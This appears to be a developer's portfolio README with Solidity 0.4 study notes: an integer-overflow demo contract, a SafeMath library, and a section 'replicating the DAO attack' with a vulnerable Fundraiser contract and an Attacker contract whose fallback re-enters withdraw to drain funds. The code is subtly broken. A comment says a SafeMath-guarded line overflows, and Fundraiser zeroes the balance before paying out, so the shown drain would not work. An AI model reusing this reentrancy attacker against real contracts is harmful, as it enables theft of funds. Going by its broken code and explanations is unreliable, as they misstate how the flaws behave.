# Saula-Atama

Software Develpment Projects\
Scales
Fantasy Football
Coin Tracker
seasons2
Pupparazzi
Royal KV

BlockChain
Multi Sig Wallet
Decentralised Exchange
Coin Tracker
Voting.
Token.





// The basis of security checks for any solidity smart contract is CHECKS-EFFECTS-INTERACTIONS Pattern.

pragma solidity ^0.4.10;

import "./SafeMath.sol";

contract Overflow{

    mapping (address=>uint) balances;

    function contribute() payable{
        balances[msg.sender] = msg.value;
    }

    function getBalance() constant returns (uint){
        return balances[msg.sender];
    }

    function batchSend(address[] _receivers, uint _value){
        // this line overflows
        uint total = SafeMath.mul(_receivers.length, _value);
        require(balances[msg.sender]>=total);

        // subtract from sender
        balances[msg.sender] = SafeMath.sub(balances[msg.sender], total);

        for(uint i=0;i<_receivers.length;i++){
            balances[_receivers[i]] = SafeMath.add(balances[_receivers[i]], _value);
        }
    }

}






pragma solidity ^0.4.10;

library SafeMath {

  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    //assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}



REPLICATING THE DAO ATTACK
pragma solidity ^0.4.8;


contract Fundraiser{
    
    mapping  (address => uint) balances;
    
    function contribute() payable{
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(){
        if(balances[msg.sender] == 0){
            throw;
        }
        
        balances[msg.sender] = 0;
        msg.sender.call.value(balances[msg.sender])();
    }
    
    function getFunds() returns (uint){
        return address(this).balance;
    }
    
}





pragma solidity ^0.4.8;

import "./Fundraiser.sol";

contract Attacker{
    
    address public fundraiserAddress;
    uint public drainTimes = 0;
    
    function Attacker(address victimAddress){
        fundraiserAddress = victimAddress;
    }
 
    function() payable{
        if(drainTimes<3){
            drainTimes++;
            Fundraiser(fundraiserAddress).withdraw();
        }
    }
    
    function getFunds() returns (uint){
        return address(this).balance;
    }
    
    function payMe() payable{
        Fundraiser(fundraiserAddress).contribute.value(msg.value)();
    }
    
    function startScam(){
        Fundraiser(fundraiserAddress).withdraw();
    }
}
// what the attcker code soes is that it kkeps calling the function of the DAO without the DAO recordeing that it has called a refund.
// Coding smart contracts , keep it simple, a good contract is simple to read and written in a simple manner, adding complexiticity like adding librarys or dependencies in libraries will present vulnerablities to your smart contract, example in injecting malicious code, calling a public function with fallbacks. which will cause major damages.
